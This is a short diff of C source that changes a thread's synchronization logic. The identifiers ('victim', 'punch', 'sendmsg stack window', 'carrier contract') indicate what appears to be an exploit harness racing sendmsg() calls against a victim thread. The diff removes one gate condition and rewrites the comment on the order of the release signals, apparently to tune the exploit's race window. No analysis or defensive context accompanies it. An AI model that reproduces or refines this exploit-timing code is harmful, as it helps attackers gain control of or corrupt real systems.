@@ -396,8 +396,7 @@ static void *s2_waiter_thread(void *arg __attribute__((unused))) {
 
   pr_info("H1A-S2 sendmsg armed tid=%d iov_total=%u delay_ms=%d\n",
           tid, S2_IOV_TOTAL, S2_ARM_DELAY_MS);
-  if (!atomic_load(&s2_punch_allowed) ||
-      atomic_load(&s2_sendmsg_ret) != S2_SENDMSG_PENDING) {
+  if (atomic_load(&s2_sendmsg_ret) != S2_SENDMSG_PENDING) {
     atomic_store(&s2_punch_allowed, 0);
     atomic_store(&s2_sendmsg_armed, 0);
     atomic_store(&s2_route_done, 1);
@@ -406,9 +405,9 @@ static void *s2_waiter_thread(void *arg __attribute__((unused))) {
   }
   s2_msleep(S2_ARM_DELAY_MS);
   atomic_store(&s2_punch_allowed, 1);
-  /* s2_sendmsg_armed is the final release signal: keep it immediately
-   * before the syscall so the consumer cannot enter the sendmsg stack
-   * window while the victim is still in logging or validation code. */
+  /* s2_sendmsg_armed is the final release signal: publish permission
+   * first, then arm only after the carrier contract and pending-state
+   * gate have passed. The consumer still requires both signals. */
   atomic_store(&s2_sendmsg_armed, 1);
   errno = 0;
   ret = (int)sendmsg(s2_sender_fd, &mh, MSG_NOSIGNAL);
